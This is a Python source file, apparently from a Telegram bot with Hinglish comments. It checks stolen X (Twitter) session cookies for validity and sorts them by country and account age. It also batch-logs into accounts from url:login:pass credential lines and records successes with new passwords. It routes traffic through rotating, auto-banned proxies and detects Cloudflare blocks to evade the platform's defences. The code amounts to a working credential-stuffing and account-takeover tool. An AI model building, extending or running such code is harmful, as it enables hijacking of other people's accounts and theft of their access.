    """host:port[:user[:pass]] parse karo, IPv6 brackets optional.

    (host, port, user, password) ya None. Bracket ke baghair IPv6 ko right se
    toda jata hai: 2001:db8::1:1080:user:pass.
    """
    s = (s or "").strip()
    if not s:
        return None
    creds = []
    if s.startswith("["):
        m = re.match(r"^\[([^\]]+)\]:(.*)$", s)
        if not m:
            return None
        host, bits = m.group(1), m.group(2).split(":")
        if not bits or not bits[0].isdigit():
            return None
        port, creds = bits[0], bits[1:]
    else:
        bits = s.split(":")
        if len(bits) in (2, 3, 4) and bits[1].isdigit():
            host, port, creds = bits[0], bits[1], bits[2:]
        elif len(bits) >= 4 and bits[-3].isdigit():
            # Unbracketed IPv6: host:port:user:pass
            host, port, creds = ":".join(bits[:-3]), bits[-3], bits[-2:]
        elif (len(bits) >= 3 and bits[-1].isdigit()
              and ":".join(bits[:-1]).count(":") >= 2):
            # Unbracketed IPv6: host:port
            host, port = ":".join(bits[:-1]), bits[-1]
        else:
            return None
    if not host or not port.isdigit() or not (0 < int(port) < 65536):
        return None
    return (host, port,
            creds[0] if len(creds) >= 1 else "",
            creds[1] if len(creds) >= 2 else "")


def mask_proxy(url):
    """Creds chhupa kar log/message ke liye safe naam."""
    try:
        p = httpx.URL(url)
    except Exception:
        return "?"
    auth = "***@" if (p.username or p.password) else ""
    port = ":" + str(p.port) if p.port else ""
    return (p.scheme or "http") + "://" + auth + _bracket_host(p.host or "?") + port


def norm_proxy(raw, default_scheme=None):
    """Ek proxy line ko httpx-compatible URL banao, ya None.

    Formats:
      scheme://[user:pass@]host:port
      socks5|host:port:user:pass        (pipe marker)
      socks5:host:port:user:pass        (colon marker)
      host:port:user:pass               (PROXY_TYPE / default scheme)
      [2001:db8::1]:1080:user:pass      (IPv6, brackets optional)
    """
    s = (raw or "").strip().strip('"').strip("'").strip()
    if not s or s.startswith("#"):
        return None
    low = s.lower()
    for bad in PROXY_UNSUPPORTED:
        if low.startswith(bad + "://"):
            # vless/vmess/ss links httpx nahi chala sakta - inhe xray/sing-box
            # ke local socks5 port mein convert karna padta hai.
            logging.warning("proxy skip: %s:// httpx support nahi karta", bad)
            PROXY_SKIPPED.append(bad)
            return None

    # Explicit scheme: scheme://, scheme| ya scheme: (provider panel style).
    scheme, sep, body = None, "", s
    m = re.match(r"^(socks5h|socks5|socks|https|http)\s*(:\/\/|\||:)\s*(.*)$",
                 s, re.I)
    if m and m.group(3):
        scheme = m.group(1).lower()
        if scheme == "socks":
            scheme = "socks5"
        sep, body = m.group(2), m.group(3)
    explicit_scheme = scheme is not None
    if scheme is None:
        scheme = (default_scheme or _default_proxy_scheme()).lower()
        if scheme not in PROXY_SCHEMES:
            scheme = "http"

    if "@" in body or "/" in body:
        # Standard URL ya provider ka path-auth style (httpx khud parse kare).
        s = scheme + "://" + body
    elif sep == "://" and "::" in body and not body.startswith("["):
        # socks5://2001:db8::1:1080 ambiguous hai - brackets zaroori.
        logging.warning("proxy invalid: IPv6 host ko [] mein likho: %s",
                        mask_proxy(s))
        return None
    else:
        parts = _colon_proxy_parts(body)
        if not parts:
            # Explicit scheme ke saath bare host OK (default port: 80/443/1080).
            bare = re.match(r"^[A-Za-z0-9._-]+$", body)
            bare_v6 = body.startswith("[") and body.endswith("]") and ":" in body
            if explicit_scheme and (bare or bare_v6):
                s = scheme + "://" + body
            else:
                logging.warning("proxy invalid (host:port chahiye): %s",
                                mask_proxy(s))
                return None
        else:
            host, port, user, pwd = parts
            auth = ""
            if user or pwd:
                auth = (quote(unquote(user), safe="") + ":"
                        + quote(unquote(pwd), safe="") + "@")
            s = scheme + "://" + auth + _bracket_host(host) + ":" + port
    try:
        p = httpx.URL(s)
    except Exception:
        logging.warning("proxy invalid: %s", mask_proxy(s))
        return None
    if p.scheme not in PROXY_SCHEMES or not p.host:
        logging.warning("proxy skip: %s", mask_proxy(s))
        return None
    if p.path not in ("", "/") and not (p.username or p.password):
        # Provider style: https://host:port/user/pass (ya /user:pass).
        segs = [x for x in p.path.split("/") if x]
        if len(segs) == 1 and ":" in segs[0]:
            segs = segs[0].split(":", 1)
        if len(segs) == 2:
            auth = quote(unquote(segs[0]), safe="") + ":" + quote(unquote(segs[1]), safe="")
            port = ":" + str(p.port) if p.port else ""
            out = p.scheme + "://" + auth + "@" + _bracket_host(p.host) + port
            logging.info("proxy auth path se liya: %s", mask_proxy(out))
            return out
        # https://host:port/token jaisi link: path httpx ignore karta hai.
        PROXY_HINT.add(mask_proxy(str(p)))
        logging.warning("proxy path ignore ho raha hai: %s "
                        "(format: http://user:pass@host:port)", mask_proxy(str(p)))
    return str(p)


def load_proxies():
    """PROXIES env + PROXY_FILE + /proxy add file, dedupe.

    /proxy reload isse dobara chalata hai.
    """
    global PROXIES
    raw = os.getenv("PROXIES", PROXIES_RAW)
    items = [x for x in re.split(r"[\s,]+", raw or "") if x]
    env_file = os.getenv("PROXY_FILE", PROXY_FILE)
    for path in (env_file, RUNTIME_PROXY_FILE):
        if not path:
            continue
        fp = path if os.path.isabs(path) else os.path.join(HERE, path)
        try:
            with open(fp, encoding="utf-8", errors="ignore") as fh:
                items += fh.read().splitlines()
        except FileNotFoundError:
            if path != RUNTIME_PROXY_FILE:
                logging.warning("PROXY_FILE nahi mila: %s", fp)
        except Exception:
            logging.exception("PROXY_FILE")
    out, seen = [], set()
    for it in items:
        u = norm_proxy(it)
        if u and u not in seen:
            seen.add(u)
            out.append(u)
    PROXIES = out
    if any(p.startswith("socks5") for p in out) and not socks_ready():
        logging.error("socks5 proxy hai lekin 'socksio' missing - "
                      "pip install 'httpx[socks]'")
    return PROXIES


def socks_ready():
    try:
        __import__("socksio")
        return True
    except Exception:
        return False


def runtime_proxy_lines():
    """/proxy add se save ki hui lines (masked nahi - file local/volume par)."""
    try:
        with open(RUNTIME_PROXY_FILE, encoding="utf-8", errors="ignore") as fh:
            return [x.strip() for x in fh.read().splitlines()
                    if x.strip() and not x.strip().startswith("#")]
    except FileNotFoundError:
        return []
    except Exception:
        logging.exception("runtime proxies read")
        return []


def save_runtime_proxy_lines(lines):
    """Runtime proxies ko volume par likho, 0600 permissions ke saath."""
    try:
        os.makedirs(STATE_DIR, exist_ok=True)
        with open(RUNTIME_PROXY_FILE, "w", encoding="utf-8") as fh:
            fh.write("\n".join(lines).strip()
                     + ("\n" if lines else ""))
        try:
            os.chmod(RUNTIME_PROXY_FILE, 0o600)
        except Exception:
            pass
        return True
    except Exception:
        logging.exception("runtime proxies save")
        return False


def proxy_mode():
    return PROXY_MODE if PROXY_MODE in ("rotate", "random") else "rotate"


_AsyncBaseTransport = getattr(httpx, "AsyncBaseTransport", object)


class RotatingProxy(_AsyncBaseTransport):
    """Per-request proxy rotation.

    Sirf connection-level errors (connect/proxy) pe next proxy try hota hai.
    Read/write timeout pe retry nahi hota, warna same tweet do dafa post ho
    sakta hai. Baar-baar fail hone wale proxy ko PROXY_BAN_MIN minute ke liye
    skip kar diya jata hai.
    """

    def __init__(self, proxies, mode="rotate"):
        self.proxies = list(proxies)
        self.mode = mode if mode in ("rotate", "random") else "rotate"
        self.idx = 0
        self.lock = asyncio.Lock()
        self.pools = {}

    def _is_banned(self, proxy):
        until = PROXY_BANNED_UNTIL.get(proxy, 0)
        if until and time.time() < until:
            return True
        if until and time.time() >= until:
            # Ban expire hua - hata do.
            PROXY_BANNED_UNTIL.pop(proxy, None)
            PROXY_FAILS.pop(proxy, None)
        return False

    def _record_fail(self, proxy):
        PROXY_FAILS[proxy] = PROXY_FAILS.get(proxy, 0) + 1
        if PROXY_FAILS[proxy] >= PROXY_BAN_THRESHOLD:
            PROXY_BANNED_UNTIL[proxy] = time.time() + PROXY_BAN_MIN * 60
            logging.warning("proxy banned %d min: %s", PROXY_BAN_MIN,
                            mask_proxy(proxy))

    def _record_ok(self, proxy):
        if PROXY_FAILS.get(proxy, 0):
            PROXY_FAILS[proxy] = max(0, PROXY_FAILS[proxy] - 1)

    async def _pick(self):
        async with self.lock:
            available = [p for p in self.proxies if not self._is_banned(p)]
            if not available:
                return None
            if self.mode == "random":
                return random.choice(available)
            p = available[self.idx % len(available)]
            self.idx += 1
            return p

    def _pool(self, proxy):
        tr = self.pools.get(proxy)
        if tr is None:
            tr = httpx.AsyncHTTPTransport(
                proxy=proxy, retries=0,
                limits=httpx.Limits(max_connections=max(CONCURRENCY * 2, 10),
                                    max_keepalive_connections=max(CONCURRENCY, 10)))
            self.pools[proxy] = tr
        return tr

    async def handle_async_request(self, request):
        last = None
        tries = min(max(len(self.proxies), 1), 3)
        for _ in range(tries):
            proxy = await self._pick()
            if proxy is None:
                break
            try:
                ret = await self._pool(proxy).handle_async_request(request)
                self._record_ok(proxy)
                return ret
            except (httpx.ConnectError, httpx.ConnectTimeout, httpx.ProxyError) as e:
                last = e
                self._record_fail(proxy)
                logging.warning("proxy fail %s: %s", mask_proxy(proxy), type(e).__name__)
            except ImportError as e:
                last = httpx.ProxyError("proxy " + mask_proxy(proxy) + ": " + str(e))
                self._record_fail(proxy)
                logging.error("proxy import fail %s: %s", mask_proxy(proxy), e)
        if last is not None:
            raise last
        raise httpx.ProxyError("koi proxy available nahi (sab banned ya fail)")

    async def aclose(self):
        for tr in list(self.pools.values()):
            try:
                await tr.aclose()
            except Exception:
                pass
        self.pools.clear()


def proxy_mounts():
    """X hosts ke liye rotating transport, baaki traffic direct."""
    if not PROXIES or PROXY_DISABLED:
        return None
    tr = RotatingProxy(PROXIES, proxy_mode())
    mounts = {}
    for host in PROXY_HOSTS:
        mounts["https://" + host] = tr
        mounts["http://" + host] = tr
    return mounts


def proxy_status_text():
    if PROXY_DISABLED and PROXIES:
        return ("Proxy: OFF (/proxy off) | " + str(len(PROXIES))
                + " configured\n/proxy on se wapas ON")
    if not PROXIES:
        txt = "Proxy: OFF (PROXIES khaali)"
        if PROXY_SKIPPED:
            txt += "\nskipped: " + ", ".join(sorted(set(PROXY_SKIPPED))) + "://"
            txt += "\n(vless/vmess/ss httpx nahi chalata - xray/sing-box se socks5 banao)"
        return txt
    lines = ["Proxy: ON (" + str(len(PROXIES)) + ") | mode " + proxy_mode(),
             "X traffic only | Telegram + Supabase direct"]
    banned_now = [(p, PROXY_BANNED_UNTIL.get(p, 0)) for p in PROXIES
                  if PROXY_BANNED_UNTIL.get(p, 0) and time.time() < PROXY_BANNED_UNTIL[p]]
    if banned_now:
        mins_left = [int((until - time.time()) // 60) for _, until in banned_now]
        lines.append("! banned: " + ", ".join(
            mask_proxy(p) + " (" + str(m) + "m)" for p, m in zip(
                [b[0] for b in banned_now], mins_left)))
    if any(PROXY_FAILS.get(p, 0) for p in PROXIES):
        lines.append("fails: " + ", ".join(
            mask_proxy(p) + "=" + str(PROXY_FAILS[p])
            for p in PROXIES if PROXY_FAILS.get(p, 0)))
    if any(p.startswith("socks5") for p in PROXIES) and not socks_ready():
        lines.append("! socksio missing: pip install 'httpx[socks]'")
    if PROXY_SKIPPED:
        lines.append("skipped: " + ", ".join(sorted(set(PROXY_SKIPPED))) + "://")
    if PROXY_HINT:
        lines.append("! path wali link: " + ", ".join(sorted(PROXY_HINT)[:3])
                     + " - path ignore hota hai. Chahiye: http://user:pass@host:port")
    lines += [str(i + 1) + ". " + mask_proxy(p) for i, p in enumerate(PROXIES[:40])]
    return "\n".join(lines)


def _proxy_tips(res):
    bad = [r for r in res if r]
    tips = []
    if any(r.get("code") == 407 for r in bad):
        tips.append("407 = proxy auth chahiye (user:pass@host:port)")
    if any("SSL" in (r.get("why") or "") for r in bad):
        tips.append("SSL error = https:// ki jagah http:// try karo")
    if any((r.get("why") or "").startswith(("ConnectError", "ConnectTimeout"))
           for r in bad):
        tips.append("connect fail = host/port galat ya proxy down")
    if any(r.get("code") in (403, 429) for r in bad):
        tips.append("403/429 = proxy IP X se blocked/limited")
    if any("non-json" in (r.get("why") or "") for r in bad):
        tips.append("non-json/block = proxy X tak pohanch raha hai lekin "
                    "Cloudflare/block page aa raha hai (IP flagged)")
    if any(("404" in (r.get("why") or "")) or ("307" in (r.get("why") or ""))
           for r in bad):
        tips.append("404/307 = ye HTTP proxy nahi hai, panel/subscription URL "
                    "lagta hai (3x-ui sub port 2096?). CONNECT accept nahi hua.")
    if any(("ProtocolError" in (r.get("why") or ""))
           or ("Malformed reply" in (r.get("why") or "")) for r in bad):
        tips.append("ProtocolError/Malformed reply = is port par SOCKS5 nahi "
                    "bol raha (HTTP proxy ho sakta hai). /proxy detect <entry> "
                    "chalao, ya /proxy add http ... try karo.")
    blocked = ("502", "503", "504", "Host unreachable", "Connection refused")
    if any(any(b in (r.get("why") or "") for b in blocked) for r in bad):
        tips.append("502/503/504/Host unreachable = proxy zinda hai lekin target "
                    "reject ho raha hai. Ye provider X block kar raha hai - "
                    "dusra location/proxy chahiye.")
    return ("\n\ntips:\n- " + "\n- ".join(tips)) if tips else ""


async def probe_proxy(proxy, timeout=None):
    t0 = time.time()
    tmo = float(timeout or PROXY_PROBE_TIMEOUT)
    try:
        async with httpx.AsyncClient(proxy=proxy,
                                     timeout=httpx.Timeout(min(15.0, tmo)),
                                     follow_redirects=False,
                                     trust_env=False) as cl:
            r = await asyncio.wait_for(
                cl.get(PROXY_TEST_URL, headers={"User-Agent": UA}), tmo)
    except asyncio.TimeoutError:
        why = "Timeout: " + str(int(tmo)) + "s (handshake atka)"
        net_note("proxy " + mask_proxy(proxy) + " " + why)
        return {"proxy": proxy, "ok": False, "why": why,
                "ms": int((time.time() - t0) * 1000)}
    except Exception as e:
        why = type(e).__name__
        detail = " ".join(str(e).split())[:40]
        if detail:
            why += ": " + detail
        net_note("proxy " + mask_proxy(proxy) + " " + why)
        return {"proxy": proxy, "ok": False, "why": why,
                "ms": int((time.time() - t0) * 1000)}
    ms = int((time.time() - t0) * 1000)
    # 407 = proxy auth chahiye, ye usable nahi. 401/403 X ka jawab ho sakta
    # hai (proxy ka masla nahi), isliye unhe reachable maana jata hai - lekin
    # sirf tab jab jawab JSON ho. Cloudflare/captcha HTML 403 = block page.
    ok = r.status_code < 500 and r.status_code != 407
    why = ""
    if ok:
        try:
            r.json()
        except Exception:
            ok = False
            why = "non-json/block"
    # Ban tracking: 5xx / non-json / connect errors = fail for ban purposes.
    if ok:
        _record_proxy_ok(proxy)
    else:
        _record_proxy_fail(proxy, why or ("HTTP " + str(r.status_code)))
    return {"proxy": proxy, "ok": ok, "code": r.status_code, "why": why,
            "ms": ms}


def _record_proxy_ok(proxy):
    PROXY_FAILS[proxy] = max(0, PROXY_FAILS.get(proxy, 0) - 1)


def _record_proxy_fail(proxy, why=""):
    PROXY_FAILS[proxy] = PROXY_FAILS.get(proxy, 0) + 1
    if PROXY_FAILS[proxy] >= PROXY_BAN_THRESHOLD:
        PROXY_BANNED_UNTIL[proxy] = time.time() + PROXY_BAN_MIN * 60
        logging.warning("proxy banned %d min: %s (why=%s)", PROXY_BAN_MIN,
                        mask_proxy(proxy), why)


_PROXY_DETECT_SCHEMES = ("socks5", "http")


def _strip_proxy_scheme(raw):
    """Entry se scheme/marker hatao, taake dono protocols try ho sakein."""
    s = (raw or "").strip()
    m = re.match(r"^(socks5h|socks5|socks|https|http)\s*(:\/\/|\||:)\s*(.*)$",
                 s, re.I)
    return m.group(3).strip() if m and m.group(3) else s


def mask_entry(raw):
    """Raw provider entry ka safe naam (host:port + auth flag)."""
    u = norm_proxy(raw)
    if u:
        return mask_proxy(u)
    parts = _colon_proxy_parts(_strip_proxy_scheme(raw))
    if parts:
        return (_bracket_host(parts[0]) + ":" + parts[1]
                + (" (auth)" if parts[2] or parts[3] else ""))
    return "?"


async def detect_proxy(raw):
    """Ek entry ko SOCKS5 aur HTTP dono tarah probe karo.

    Provider panel dono ka format same deta hai (ip:port:user:pass), sirf
    protocol/port alag hota hai. Jis par JSON aaye wahi sahi type hai.
    """
    tail = _strip_proxy_scheme(raw)
    out = []
    for sch in _PROXY_DETECT_SCHEMES:
        u = norm_proxy(tail, sch)
        if not u:
            out.append({"scheme": sch, "proxy": None, "ok": False,
                        "why": "invalid entry"})
            continue
        r = probe_proxy(u)
        if asyncio.iscoroutine(r):
            r = await r
        r["scheme"] = sch
        out.append(r)
    return out


# ============================ WORKERS ============================
def http_client(use_proxy=True):
    global _SHARED_CLIENT
    # Non-proxy calls (Supabase, etc.) reuse a shared client for connection pooling.
    if not use_proxy:
        if _SHARED_CLIENT is None:
            _SHARED_CLIENT = httpx.AsyncClient(
                follow_redirects=True,
                timeout=httpx.Timeout(TIMEOUT, connect=min(15.0, TIMEOUT)),
                limits=httpx.Limits(max_connections=max(CONCURRENCY * 2, 10),
                                    max_keepalive_connections=max(CONCURRENCY, 10)))
        return _SHARED_CLIENT
    kw = dict(
        follow_redirects=True,
        timeout=httpx.Timeout(TIMEOUT, connect=min(15.0, TIMEOUT)),
        limits=httpx.Limits(max_connections=max(CONCURRENCY * 2, 10),
                            max_keepalive_connections=max(CONCURRENCY, 10)))
    mounts = proxy_mounts()
    if mounts:
        kw["mounts"] = mounts
        # PROXIES hi source of truth; HTTP(S)_PROXY env ignore karo
        kw["trust_env"] = False
    return httpx.AsyncClient(**kw)


async def close_shared_client():
    """Shared client ko shutdown pe band karein."""
    global _SHARED_CLIENT
    if _SHARED_CLIENT is not None:
        try:
            await _SHARED_CLIENT.aclose()
        except Exception:
            pass
        _SHARED_CLIENT = None


async def pmap(fn, items, conc=None):
    sem = asyncio.Semaphore(max(int(conc or CONCURRENCY), 1))

    async def run(x):
        async with sem:
            try:
                return await fn(x)
            except asyncio.CancelledError:
                raise
            except Exception:
                logging.exception("pmap item")
                return None

    return await asyncio.gather(*(run(x) for x in items))


async def progress_heartbeat(prog, seconds=3.0):
    while True:
        await asyncio.sleep(seconds)
        await prog.update(force=True)


async def pmap_progress(prog, fn, items, conc=None):
    async def run(x):
        try:
            return await fn(x)
        finally:
            prog.done += 1

    hb = asyncio.create_task(progress_heartbeat(prog))
    try:
        return await pmap(run, items, conc)
    finally:
        hb.cancel()


# ============================ RUNNERS ============================
async def process_cookie_zip(ip, op, live, prog, sink=None, uid="0"):
    with zipfile.ZipFile(ip) as zin:
        names = zip_txt_names(zin)
        prog.total = len(names)

        async def one(name):
            try:
                raw = zip_read_bytes(zin, name)
                out, data, cookies = await rework_cookie(
                    raw.decode("utf-8", "ignore"), client, live)
                if not cookies:
                    # Cookie file hi nahi hai - original hi wapas bhejo.
                    return name, None, data, [], raw
                return name, out, data, cookies, None
            except asyncio.CancelledError:
                raise
            except Exception:
                logging.exception("cookie %s", name)
                try:
                    raw = zip_read_bytes(zin, name)
                except Exception:
                    raw = b""
                return name, None, {}, [], raw

        async with http_client() as client:
            results = await pmap_progress(prog, one, names)

    with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as zout:
        used = set()
        for name, out, data, cookies, raw in results:
            if out is None:
                if raw:
                    try:
                        zout.writestr(_unique_name(name, used), raw)
                    except Exception:
                        pass
                prog.fail += 1
                continue
            try:
                zout.writestr(_unique_name(name, used), out)
            except Exception:
                prog.fail += 1
                continue
            if data.get("Status") == "LIVE":
                prog.live += 1
                if sink is not None and cookies:
                    row = db_row_from(data, cookie_dict(cookies), uid)
                    if row:
                        sink.append(row)
            elif data.get("Status") == "UNKNOWN":
                prog.unk += 1
                prog.add_note("unknown: " + str(data.get("Reason") or "?"))
            elif data.get("Status") == "DEAD":
                prog.add_note("dead: " + str(data.get("Reason") or "?"))
            prog.ok += 1
    prog.done = prog.total
    await prog.update(force=True)
    return prog.ok, prog.fail, prog.total


async def process_verify(ip, op, live, prog, sink=None, uid="0"):
    working, dead, unknown = [], [], []
    with zipfile.ZipFile(ip) as zin:
        names = zip_txt_names(zin)
        prog.total = len(names)

        async def one(name):
            try:
                text = zip_read_text(zin, name)
            except asyncio.CancelledError:
                raise
            except Exception:
                logging.exception("verify read %s", name)
                return None
            data, cookies = parse_cookie_file(text)
            if cookies and live:
                ld = await live_check(client, cookie_dict(cookies))
            elif cookies:
                ld = {"Status": "UNKNOWN", "Reason": "live check off"}
            else:
                ld = {"Status": "DEAD", "Reason": "no cookies"}
            # Always overwrite the old Status/Reason from the file, otherwise a
            # stale "LIVE" line would be counted as live without being checked.
            data["Status"] = str(ld.get("Status") or "UNKNOWN")
            data["Reason"] = str(ld.get("Reason") or "")
            for k, v in ld.items():
                if v not in ("", None):
                    data[k] = str(v)
            return name, build_cookie_file(data, cookies), data, cookies

        async with http_client() as client:
            results = await pmap_progress(prog, one, names)

    for item in results:
        if not item:
            prog.fail += 1
            continue
        name, body, data, cookies = item
        st = data.get("Status") or "UNKNOWN"
        if st == "LIVE":
            working.append((name, body))
            prog.ok += 1
            prog.live += 1
            if sink is not None:
                row = db_row_from(data, cookie_dict(cookies), uid)
                if row:
                    sink.append(row)
        elif st == "UNKNOWN":
            unknown.append((name, body))
            prog.unk += 1
            prog.add_note("unknown: " + str(data.get("Reason") or "?"))
        else:
            dead.append((name, body))
            prog.fail += 1
            prog.add_note("dead: " + str(data.get("Reason") or "?"))
    with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as z:
        used = set()
        for name, out in working:
            z.writestr("working/" + _unique_name(os.path.basename(name), used), out)
        used = set()
        for name, out in dead:
            z.writestr("dead/" + _unique_name(os.path.basename(name), used), out)
        used = set()
        for name, out in unknown:
            z.writestr("unknown/" + _unique_name(os.path.basename(name), used), out)
        z.writestr("summary.txt", "working: " + str(len(working))
                   + "\ndead: " + str(len(dead))
                   + "\nunknown: " + str(len(unknown))
                   + "\n\nunknown = network/server ne jawab nahi diya,"
                     " dobara verify karo (ye dead nahi hain).")
    prog.done = prog.total
    await prog.update(force=True)


async def process_verify_single(ip, op, live, prog, sink=None, uid="0"):
    with open(ip, encoding="utf-8", errors="ignore") as fh:
        data, cookies = parse_cookie_file(fh.read())
    prog.total = 1
    if cookies and live:
        async with http_client() as client:
            ld = await live_check(client, cookie_dict(cookies))
    elif cookies:
        ld = {"Status": "UNKNOWN", "Reason": "live check off"}
    else:
        ld = {"Status": "DEAD", "Reason": "no cookies"}
    data["Status"] = str(ld.get("Status") or "UNKNOWN")
    data["Reason"] = str(ld.get("Reason") or "")
    for k, v in ld.items():
        if v not in ("", None):
            data[k] = str(v)
    st = data["Status"]
    body = build_cookie_file(data, cookies)
    folder = "working" if st == "LIVE" else ("unknown" if st == "UNKNOWN" else "dead")
    with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(folder + "/account.txt", body)
        z.writestr("summary.txt", "working: " + ("1" if st == "LIVE" else "0")
                   + "\ndead: " + ("1" if st == "DEAD" else "0")
                   + "\nunknown: " + ("1" if st == "UNKNOWN" else "0")
                   + "\nreason: " + str(data.get("Reason") or "-"))
    if st == "LIVE":
        prog.ok += 1
        prog.live += 1
        if sink is not None:
            row = db_row_from(data, cookie_dict(cookies), uid)
            if row:
                sink.append(row)
    elif st == "UNKNOWN":
        prog.unk += 1
        prog.add_note("unknown: " + str(data.get("Reason") or "?"))
    else:
        prog.fail += 1
        prog.add_note("dead: " + str(data.get("Reason") or "?"))
    prog.done = 1
    await prog.update(force=True)


async def process_split(ip, op, cfg, live, prog):
    field = cfg["field"]
    buckets = cfg["buckets"]
    is_num = field in NUM_FIELDS
    out = {label: [] for label, _, _, _ in buckets}
    unmatched = []
    with zipfile.ZipFile(ip) as zin:
        names = zip_txt_names(zin)
        prog.total = len(names)

        async def one(name):
            try:
                text = zip_read_text(zin, name)
            except asyncio.CancelledError:
                raise
            except Exception:
                logging.exception("split read %s", name)
                return None
            data, cookies = parse_cookie_file(text)
            val = field_value(data, field)
            if live and not val and cookies:
                ld = await live_check(client, cookie_dict(cookies))
                for k, v in ld.items():
                    if v not in ("", None):
                        data[k] = str(v)
                val = field_value(data, field)
            if field in BOOL_FIELDS:
                val = norm_bool(val)
            elif field == "country":
                val = to_iso(val)
            return name, build_cookie_file(data, cookies), bucket_for(val, buckets, is_num)

        async with http_client() as client:
            results = await pmap_progress(prog, one, names)

    for item in results:
        if not item:
            prog.fail += 1
            continue
        name, body, label = item
        base = os.path.basename(name) or "account.txt"
        if label:
            out[label].append((base, body))
            prog.ok += 1
        else:
            unmatched.append((base, body))
            prog.fail += 1

    summary = ["Split by " + field, ""]
    with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as z:
        for label, items in out.items():
            safe = re.sub(r"[^A-Za-z0-9._+-]", "_", label)
            used = set()
            for base, body in items:
                z.writestr("split_" + safe + "/" + _unique_name(base, used), body)
            summary.append(label + ": " + str(len(items)))
        used = set()
        for base, body in unmatched:
            z.writestr("split_unmatched/" + _unique_name(base, used), body)
        summary.append("unmatched: " + str(len(unmatched)))
        z.writestr("summary.txt", "\n".join(summary))
    prog.done = prog.total
    await prog.update(force=True)


async def process_extract(ip, op, cfg, live, prog):
    filt = cfg["filter"]
    kept, dropped = [], []
    with zipfile.ZipFile(ip) as zin:
        names = zip_txt_names(zin)
        prog.total = len(names)

        async def one(name):
            try:
                raw = zip_read_text(zin, name)
            except asyncio.CancelledError:
                raise
            except Exception:
                logging.exception("extract read %s", name)
                return None
            data, cookies = parse_cookie_file(raw)
            iso = data.get("Country") or ""
            year = data.get("Year") or ""
            if live and cookies and (filt["countries"] or filt["years"]):
                det = await live_check(client, cookie_dict(cookies))
                for k, v in det.items():
                    if v not in ("", None):
                        data[k] = str(v)
                iso = data.get("Country") or ""
                year = data.get("Year") or ""
            iso = to_iso(iso)
            ok = True
            if filt["countries"] and iso not in filt["countries"]:
                ok = False
            if ok and not year_in(year, filt["years"]):
                ok = False
            return name, build_cookie_file(data, cookies), ok

        async with http_client() as client:
            results = await pmap_progress(prog, one, names)

    for item in results:
        if not item:
            prog.fail += 1
            continue
        name, body, ok = item
        base = os.path.basename(name) or "a.txt"
        if ok:
            kept.append((base, body))
            prog.ok += 1
        else:
            dropped.append((base, body))
            prog.fail += 1
    with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as z:
        used = set()
        for base, body in kept:
            z.writestr("filtered/" + _unique_name(base, used), body)
        used = set()
        for base, body in dropped:
            z.writestr("excluded/" + _unique_name(base, used), body)
        z.writestr("summary.txt", "filtered: " + str(len(kept))
                   + "\nexcluded: " + str(len(dropped)))
    prog.done = prog.total
    await prog.update(force=True)


async def run_ulp_batch(uid, lines, prog):
    b = BATCH[uid]
    b["lines"] = lines
    b["results"] = [None] * len(lines)
    prog.total = len(lines)
    sem = asyncio.Semaphore(max(CONCURRENCY, 1))

    async def one(idx, line):
        async with sem:
            cl = None
            try:
                ulp = parse_ulp(line)
                if not ulp:
                    b["results"][idx] = {"ok": False, "line": line, "err": "parse"}
                    prog.fail += 1
                    return
                cl, ok, info = await asyncio.wait_for(ulp_login(ulp), ACC_TIMEOUT)
                if info.get("pending"):
                    PEND.setdefault(uid, {})[str(idx)] = {
                        "kind": "login", "client": cl,
                        "flow_token": info["flow_token"],
                        "subtask": info["pending"], "ulp": ulp, "idx": idx,
                        "at": time.time()}
                    b["results"][idx] = {"ok": False, "line": line, "ulp": ulp,
                                         "pending": info["pending"]}
                    prog.pend += 1
                elif not ok:
                    b["results"][idx] = {"ok": False, "line": line, "ulp": ulp,
                                         "err": "login_failed"}
                    prog.fail += 1
                    await cl.aclose()
                else:
                    r = await finish_account(uid, idx, ulp, cl)
                    if r == "email_pending":
                        prog.pend += 1
                    elif r == "fail":
                        prog.fail += 1
                    else:
                        prog.ok += 1
            except asyncio.CancelledError:
                raise
            except asyncio.TimeoutError:
                b["results"][idx] = {"ok": False, "line": line, "err": "timeout"}
                prog.fail += 1
            except Exception:
                logging.exception("ulp one")
                b["results"][idx] = {"ok": False, "line": line, "err": "exception"}
                prog.fail += 1
                if cl is not None:
                    try:
                        await cl.aclose()
                    except Exception:
                        pass
            finally:
                prog.done += 1
                save_batch(uid)

    async def heartbeat():
        while prog.done < prog.total:
            await asyncio.sleep(3)
            await prog.update(force=True)

    hb = asyncio.create_task(heartbeat())
    try:
        await asyncio.gather(*(one(i, l) for i, l in enumerate(lines)))
    finally:
        hb.cancel()
        save_batch(uid, force=True)


def batch_counts(b, pend_idx=()):
    """Authoritative ok/fail/pending counts from results (not counters)."""
    ok = fail = pend = 0
    pset = {str(x) for x in (pend_idx or {})}
    for i, r in enumerate(b.get("results") or []):
        if not r:
            continue
        if str(i) in pset or r.get("pending"):
            pend += 1
        elif r.get("ok"):
            ok += 1
        else:
            fail += 1
    return ok, fail, pend


def build_zip(path, uid):
    b = BATCH[uid]
    ok = [r for r in b["results"] if r and r.get("ok")]
    pend = [r for r in b["results"] if r and not r.get("ok") and r.get("pending")]
    bad = [r for r in b["results"] if r and not r.get("ok") and not r.get("pending")]
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("results.txt", "\n".join(fmt_result(r) for r in b["results"] if r))
        lines = []
        for r in ok:
            name = r["details"].get("Username", "")
            mail = r["details"].get("Email", "") or r["ulp"].get("email", "")
            lines.append(name + ":" + mail + ":"
                         + (r.get("new_pass") or r["ulp"]["password"]))
        z.writestr("success.txt", "\n".join(lines))
        z.writestr("failed.txt", "\n".join((_ulp_identity(r.get("line") or "") for r in bad)))
        z.writestr("pending.txt", "\n".join((_ulp_identity(r.get("line") or "") for r in pend)))
    return path


# ============================ HANDLERS ============================
def _ctx_msg(u):
    """Message for replies. Callback updates have u.message == None."""
    m = getattr(u, "effective_message", None)
    if m is None:
        q = getattr(u, "callback_query", None)
        m = getattr(q, "message", None)
    return m


async def _ctx_say(u, text):
    m = _ctx_msg(u)
    if m is not None:
        return await m.reply_text(text)
    chat = getattr(u, "effective_chat", None)
    if chat is not None:
        return await chat.send_message(text)
    raise RuntimeError("chat nahi mila")


async def _send_zip(u, path, filename, caption):
    size = os.path.getsize(path)
